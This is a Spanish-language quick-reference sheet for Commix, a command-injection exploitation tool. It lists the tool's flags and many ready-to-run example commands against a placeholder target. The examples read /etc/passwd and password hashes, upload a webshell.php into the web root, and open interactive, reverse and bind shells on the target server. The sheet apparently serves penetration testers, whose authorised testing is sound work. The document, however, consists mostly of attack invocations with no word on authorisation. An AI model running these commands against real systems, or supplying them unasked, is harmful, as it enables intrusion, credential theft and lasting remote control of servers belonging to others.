# Commix - Referencia

Explotador de Command Injection. Soporta tecnicas classic (results-based), time-based blind y file-based (semiblind).

## Instalacion

```bash
sudo apt install commix                     # Kali/Debian
git clone https://github.com/commixproject/commix.git  # GitHub
sudo snap install commix                    # Snap
docker pull commixproject/commix            # Docker
```

## Tecnicas

| Tecnica | Tipo | Descripcion |
|---------|------|-------------|
| Classic | In-band | Output reflejado en la respuesta HTTP |
| Time-based blind | Blind | Inferir via delay (sleep) |
| File-based | Semi-blind | Escribe output a archivo, lo lee via HTTP |

## Flags

### Target y Request
```
-u URL, --url=URL          URL objetivo (requerido)
--data=DATA                POST data (cambia a POST automaticamente)
--cookie=COOKIE            Cookie HTTP
--headers=HEADERS          Headers extra
--user-agent=AGENT         User-Agent
--random-agent             User-Agent aleatorio
--referer=REFERER          Referer
--proxy=PROXY              Proxy HTTP
--tor                      Usar Tor
--auth-type=TYPE           Auth HTTP: basic, digest, bearer
--auth-cred=CRED           Credenciales (user:pass)
--force-ssl                Forzar SSL/HTTPS
```

### Inyeccion
```
-p PARAMETER               Parametro(s) a probar
--prefix=PREFIX            Prefijo de payload
--suffix=SUFFIX            Sufijo de payload
--technique=TECHNIQUE      Tecnicas: c=classic, e=eval, t=time, f=file (default: todas)
--level=LEVEL              Nivel (1-3, default 1): 2=+cookies, 3=+UA/Referer
--os=OS                    Forzar OS: 'Windows' o 'Unix'
--tamper=TAMPER            Tamper script (ej: base64encode)
--skip-waf                 Saltar deteccion de WAF
--web-root=WEB_ROOT        Root del web server (ej: /var/www/html)
```

### Enumeracion
```
--current-user             Usuario actual
--hostname                 Hostname del servidor
--is-root                  Es root?
--sys-info                 Info del sistema (OS, arch)
--users                    Usuarios del sistema
--passwords                Passwords (/etc/shadow)
--privileges               Privilegios
```

### Archivos
```
--file-read=FILE           Leer archivo del target
--file-write=FILE          Escribir archivo local al target
--file-upload=FILE         Subir archivo al target
--file-dest=DEST           Path destino en target
```

### Shell / Comandos
```
--os-cmd=COMMAND           Ejecutar un comando
--os-shell                 Shell interactivo
--reverse-shell            Reverse shell TCP
--bind-shell               Bind shell TCP
```

### General
```
--batch                    Sin interaccion
--verbose                  Verbose
-s SESSION_FILE            Cargar sesion
--flush-session            Limpiar sesion
```

## Ejemplos Practicos

```bash
# GET param basico
commix --url="http://target.com/page?ip=127.0.0.1"

# Parametro especifico
commix --url="http://target.com/page?ip=127.0.0.1&submit=check" -p ip

# POST data
commix --url="http://target.com/cmd.php" --data="ip=127.0.0.1&submit=check" -p ip

# Solo classic (rapido)
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --technique=c

# Solo time-based blind
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --technique=t

# File-based
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --technique=f --web-root="/var/www/html"

# Ejecutar comando unico
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --os-cmd="whoami"
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --os-cmd="cat /etc/passwd"

# Shell interactivo
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --os-shell

# Reverse shell
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --reverse-shell

# Enumeracion completa
commix --url="http://target.com/cmd.php?ip=127.0.0.1" \
  --current-user --hostname --is-root --sys-info --batch

# Leer archivo
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --file-read="/etc/passwd"

# Subir archivo
commix --url="http://target.com/cmd.php?ip=127.0.0.1" \
  --file-upload="webshell.php" --file-dest="/var/www/html/"

# Via proxy
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --proxy="127.0.0.1:8080"

# Auth HTTP basic
commix --url="http://target.com/cmd.php?ip=127.0.0.1" --auth-type="basic" --auth-cred="admin:pass"

# Scan agresivo completo
commix --url="http://target.com/cmd.php?ip=127.0.0.1" \
  --level=3 --random-agent --batch --verbose --technique=ctf --os=Unix
```
